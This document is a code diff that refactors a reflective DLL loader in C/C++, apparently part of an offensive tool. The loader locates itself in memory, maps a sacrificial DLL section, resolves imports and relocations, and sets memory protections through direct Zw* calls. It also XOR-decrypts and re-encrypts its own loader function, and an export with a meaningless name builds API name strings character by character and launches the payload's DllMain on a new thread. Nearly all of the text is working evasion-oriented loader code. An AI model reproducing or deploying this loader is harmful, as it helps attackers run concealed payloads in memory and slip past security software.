@@ -56,7 +56,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	IMAGE_OPTIONAL_HEADER	ImgOptHdr = { 0 };
 	IMAGE_FILE_HEADER img_file_hdr = { 0 };
 
-	PIMAGE_SECTION_HEADER* pe_sections = NULL;
+	PIMAGE_SECTION_HEADER* pe_section_ptr_array = NULL;
 	PIMAGE_IMPORT_DESCRIPTOR img_imp_desc = NULL;
 	PIMAGE_THUNK_DATA64 original_first_thunk = NULL;
 	PIMAGE_THUNK_DATA64 first_thunk = NULL;
@@ -85,10 +85,10 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 
 	//locate DLL in memory
 	PDLL_HEADER dll_hdr = NULL;
-	ULONG_PTR reflective_dll_base = NULL;
+	ULONG_PTR current_module_base = NULL;
 
 	//new PE in memory and memory to free once loaded
-	PBYTE pebase = NULL;
+	PBYTE reflective_dll_base = NULL;
 	PBYTE mem_to_free = NULL;
 
 	//function prototpyes
@@ -155,33 +155,33 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	}
 
 	/* brute force reflective dll base address search */
-	reflective_dll_base = (ULONG_PTR)ReflectiveFunction;
+	current_module_base = (ULONG_PTR)ReflectiveFunction;
 	while (TRUE)
 	{
-		dll_hdr = (PDLL_HEADER)reflective_dll_base;
+		dll_hdr = (PDLL_HEADER)current_module_base;
 		if (dll_hdr->header = 0x44434241)
 		{
-			img_dos_hdr = (PIMAGE_DOS_HEADER)(reflective_dll_base + (16));
+			img_dos_hdr = (PIMAGE_DOS_HEADER)(current_module_base + (16));
 			if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
 			{
-				img_nt_hdrs = (PIMAGE_NT_HEADERS)(reflective_dll_base + img_dos_hdr->e_lfanew + 16);
+				img_nt_hdrs = (PIMAGE_NT_HEADERS)(current_module_base + img_dos_hdr->e_lfanew + 16);
 
 				if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
 					break;
 			}
 
 		}
-		reflective_dll_base--;
+		current_module_base--;
 	}
 
 
 	// here it still needs to be adjusted because there are the headers in
 	// between, check some lines later
 
-	if (!reflective_dll_base)
+	if (!current_module_base)
 		return FALSE;
 
-	mem_to_free = (PBYTE)reflective_dll_base;
+	mem_to_free = (PBYTE)current_module_base;
 
 	PIMAGE_OPTIONAL_HEADER img_opt_hdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)img_nt_hdrs
 		+ sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); // skip nt_hdrs->Signature
@@ -237,12 +237,12 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	HANDLE new_section_handle = NULL;
 	SIZE_T view_size = NULL;
 
-	sac_dll_payload_size_for_syscall = sac_dll_payload_size_for_syscall + 24;
+	sac_dll_payload_size_for_syscall = sac_dll_payload_size_for_syscall + 32;
 
-	// size of sacrifical dll( SRH.dll) + 24
+	// size of sacrifical dll( SRH.dll) + 32
 	LARGE_INTEGER section_size = { sac_dll_payload_size_for_syscall };
 
-	// create new section, which size is the size of sacrifical dll( SRH.dll) plus 24
+	// create new section, which size is the size of sacrifical dll( SRH.dll) plus 32
 	if (status = ZwCreateSection(
 		&new_section_handle,
 		SECTION_ALL_ACCESS,
@@ -285,27 +285,29 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 
 	// fixing the base address including the 16 bytes of header.
 	// skip the custom header
-	reflective_dll_base = reflective_dll_base + (16);
+	current_module_base = current_module_base + (16);
 
-	pebase = (PBYTE)sac_dll;
-	custom_memcpy_classic(pebase, &sac_dll_handle, sizeof(HANDLE));
-	pebase += sizeof(HANDLE);
-	custom_memcpy_classic(pebase, &new_section_handle, sizeof(HANDLE));
-	pebase += sizeof(HANDLE);
-	custom_memcpy_classic(pebase, &sac_dll_payload_size_for_syscall, sizeof(SIZE_T));
-	pebase += sizeof(SIZE_T);
-	custom_memcpy_classic(pebase, &mem_to_free, sizeof(PBYTE));
-	pebase += sizeof(PBYTE);
+	reflective_dll_base = (PBYTE)sac_dll;
+	custom_memcpy_classic(reflective_dll_base, &sac_dll_handle, sizeof(HANDLE));
+	reflective_dll_base += sizeof(HANDLE);
+	custom_memcpy_classic(reflective_dll_base, &new_section_handle, sizeof(HANDLE));
+	reflective_dll_base += sizeof(HANDLE);
+	custom_memcpy_classic(reflective_dll_base, &sac_dll_payload_size_for_syscall, sizeof(SIZE_T));
+	reflective_dll_base += sizeof(SIZE_T);
+	custom_memcpy_classic(reflective_dll_base, &mem_to_free, sizeof(PBYTE));
+	reflective_dll_base += sizeof(PBYTE);
+
+	//custom_memcpy_classic(reflective_dll_base, (VOID*)current_module_base, 0x1000);
 
 
 	// allocate memory to record the current pe section header pointers
-	PVOID pe_section_temp = NULL;
+	PVOID pe_section_ptr_buf = NULL;
 	SIZE_T s_size = 0x0;
 	s_size = sizeof(PIMAGE_SECTION_HEADER) * img_file_hdr.NumberOfSections;
 
 	if ((status = ZwAllocateVirtualMemory(
 		((HANDLE)(LONG_PTR)-1),
-		&pe_section_temp,
+		&pe_section_ptr_buf,
 		0,
 		&s_size,
 		MEM_RESERVE | MEM_COMMIT,
@@ -315,22 +317,22 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	)) != 0)
 		return FALSE;
 
-	pe_sections = (PIMAGE_SECTION_HEADER*)pe_section_temp;
+	pe_section_ptr_array = (PIMAGE_SECTION_HEADER*)pe_section_ptr_buf;
 
-	if (pe_sections == NULL)
+	if (pe_section_ptr_array == NULL)
 		return FALSE;
 
 	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
 	{
-		pe_sections[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)img_nt_hdrs) + 4 + 20 + img_file_hdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));
+		pe_section_ptr_array[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)img_nt_hdrs) + 4 + 20 + img_file_hdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));
 	}
 
 	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
 	{
 		custom_memcpy(
-			(PVOID)(pebase + pe_sections[i]->VirtualAddress),
-			(PVOID)(reflective_dll_base + pe_sections[i]->PointerToRawData),
-			pe_sections[i]->SizeOfRawData,
+			(PVOID)(reflective_dll_base + pe_section_ptr_array[i]->VirtualAddress),
+			(PVOID)(current_module_base + pe_section_ptr_array[i]->PointerToRawData),
+			pe_section_ptr_array[i]->SizeOfRawData,
 			(PBYTE)(resolve_jmp_to_actual_function(ReflectiveFunction)),
 			dll_hdr->funcSize
 		);
@@ -340,16 +342,16 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	for (size_t i = 0; i < img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
 	{
 
-		img_imp_desc = (PIMAGE_IMPORT_DESCRIPTOR)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);
+		img_imp_desc = (PIMAGE_IMPORT_DESCRIPTOR)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);
 		if (img_imp_desc->OriginalFirstThunk == NULL && img_imp_desc->FirstThunk == NULL)
 			break;
 
-		dll = func_LoadLibraryA((LPSTR)(pebase + img_imp_desc->Name));
+		dll = func_LoadLibraryA((LPSTR)(reflective_dll_base + img_imp_desc->Name));
 		if (dll == NULL)
 			return FALSE;
 
-		original_first_thunk = (PIMAGE_THUNK_DATA64)(pebase + img_imp_desc->OriginalFirstThunk);
-		first_thunk = (PIMAGE_THUNK_DATA64)(pebase + img_imp_desc->FirstThunk);
+		original_first_thunk = (PIMAGE_THUNK_DATA64)(reflective_dll_base + img_imp_desc->OriginalFirstThunk);
+		first_thunk = (PIMAGE_THUNK_DATA64)(reflective_dll_base + img_imp_desc->FirstThunk);
 
 		while (original_first_thunk->u1.Function != NULL && first_thunk->u1.Function != NULL)
 		{
@@ -362,7 +364,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 			}
 			else
 			{
-				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(pebase + original_first_thunk->u1.AddressOfData);
+				pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(reflective_dll_base + original_first_thunk->u1.AddressOfData);
 				import_func_address = GPAR(dll, pImgImportByName->Name);
 				if (import_func_address != nullptr)
 					first_thunk->u1.Function = (ULONGLONG)import_func_address;
@@ -375,8 +377,8 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	}
 
 	/* APPLE BASE RELOCATIONS */
-	delta = (ULONG_PTR)pebase - img_opt_hdr->ImageBase;
-	img_reloc = (PIMAGE_BASE_RELOCATION)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+	delta = (ULONG_PTR)reflective_dll_base - img_opt_hdr->ImageBase;
+	img_reloc = (PIMAGE_BASE_RELOCATION)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
 
 	while (img_reloc->VirtualAddress)
 	{
@@ -389,25 +391,25 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 			{
 			case IMAGE_REL_BASED_DIR64:
 			{
-				ULONGLONG* to_adjust = (ULONGLONG*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
+				ULONGLONG* to_adjust = (ULONGLONG*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
 				*to_adjust += (ULONGLONG)delta;
 			}
 			break;
 			case IMAGE_REL_BASED_HIGHLOW:
 			{
-				DWORD* to_adjust = (DWORD*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
+				DWORD* to_adjust = (DWORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
 				*to_adjust += (DWORD)delta;
 			}
 			break;
 			case IMAGE_REL_BASED_HIGH:
 			{
-				WORD* to_adjust = (WORD*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
+				WORD* to_adjust = (WORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
 				*to_adjust += HIWORD(delta);
 			}
 			break;
 			case IMAGE_REL_BASED_LOW:
 			{
-				WORD* to_adjust = (WORD*)(pebase + img_reloc->VirtualAddress + reloc_entry->Offset);
+				WORD* to_adjust = (WORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
 				*to_adjust += LOWORD(delta);
 			}
 			break;
@@ -433,50 +435,50 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
 	{
 		// write
-		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
 		{
 			section_protection = PAGE_WRITECOPY;
 		}
 
 		//read
-		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ)
+		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ)
 		{
 			section_protection = PAGE_READONLY;
 		}
 
 		// execute
-		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
+		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
 		{
 			section_protection = PAGE_EXECUTE;
 		}
 
 		// read and  write
-		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ
-			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
+			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
 		{
 			section_protection = PAGE_READWRITE;
 		}
 
 		// execute and write
-		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
-			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
+			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
 		{
 			section_protection = PAGE_EXECUTE_WRITECOPY;
 		}
-		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ
-			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
+		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
+			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
 		{
 			section_protection = PAGE_EXECUTE_READ;
 		}
-		if (pe_sections[i]->Characteristics & IMAGE_SCN_MEM_READ
-			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
-			&& pe_sections[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
+		if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
+			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
+			&& pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
 		{
 			section_protection = PAGE_EXECUTE_READWRITE;
 		}
 
-		mem_addr_for_syscall = (PVOID)(pebase + pe_sections[i]->VirtualAddress);
-		payload_size_for_syscall = (SIZE_T)pe_sections[i]->SizeOfRawData;
+		mem_addr_for_syscall = (PVOID)(reflective_dll_base + pe_section_ptr_array[i]->VirtualAddress);
+		payload_size_for_syscall = (SIZE_T)pe_section_ptr_array[i]->SizeOfRawData;
 
 		if ((status = ZwProtectVirtualMemory(
 			((HANDLE)(LONG_PTR)-1),
@@ -494,11 +496,11 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	/* Register Exceptions handlers */
 	if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size)
 	{
-		img_runtime_func_entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
+		img_runtime_func_entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
 		if (!func_RtlAddFunctionTable(
 			img_runtime_func_entry,
 			(img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(PIMAGE_RUNTIME_FUNCTION_ENTRY)),
-			(DWORD64)pebase))
+			(DWORD64)reflective_dll_base))
 		{
 			; // do nothing
 		}
@@ -507,13 +509,13 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	/* Execute TLS callbacks */
 	if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
 	{
-		img_tls_dict = (PIMAGE_TLS_DIRECTORY)(pebase + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
+		img_tls_dict = (PIMAGE_TLS_DIRECTORY)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
 		tls_callbacks = (PIMAGE_TLS_CALLBACK*)(img_tls_dict->AddressOfCallBacks);
 
 		int i = 0;
 		while (tls_callbacks[i] != NULL)
 		{
-			tls_callbacks[i]((LPVOID)pebase, DLL_PROCESS_ATTACH, NULL);
+			tls_callbacks[i]((LPVOID)reflective_dll_base, DLL_PROCESS_ATTACH, NULL);
 		}
 
 	}
@@ -535,7 +537,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	__except (EXCEPTION_EXECUTE_HANDLER) {
 	}
 
-	return pebase;
+	return reflective_dll_base;
 
 }
 
@@ -544,8 +546,8 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 	WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
 	CHAR str_create_thread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };
 
-	fnCreateThread fn_create_thread = NULL;
-	if ((fn_create_thread = (fnCreateThread)GPAR(GMHR(kernel32), str_create_thread)) == NULL)
+	fnCreateThread func_CreateThread = NULL;
+	if ((func_CreateThread = (fnCreateThread)GPAR(GMHR(kernel32), str_create_thread)) == NULL)
 		return FALSE;
 
 	fnDllMain p_dll_main = NULL;
@@ -596,11 +598,7 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 	// decrypting the reflective function
 	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
 	{
-		//if (j >= sizeof(p_dll_header->key))
-		//{
-		//	j = 0;
-		//}
-		reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
+		reflective_addr[i] ^= KEY[j % 4];
 	}
 
 	pebase = ReflectiveFunction();
@@ -608,18 +606,14 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 	// re-encrypting the reflective function
 	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
 	{
-		//if (j >= sizeof(p_dll_header->key))
-		//{
-		//	j = 0;
-		//}
-		reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
+		reflective_addr[i] ^= KEY[j % 4];
 	}
 
 	p_dll_header->key = { 0 };
 
 	p_dll_main = (fnDllMain)(pebase + p_img_nt_hdrs->OptionalHeader.AddressOfEntryPoint);
 
-	HANDLE h_thread = fn_create_thread(
+	HANDLE h_thread = func_CreateThread(
 		NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
 		(LPVOID)p_dll_main, 0, NULL
 	);
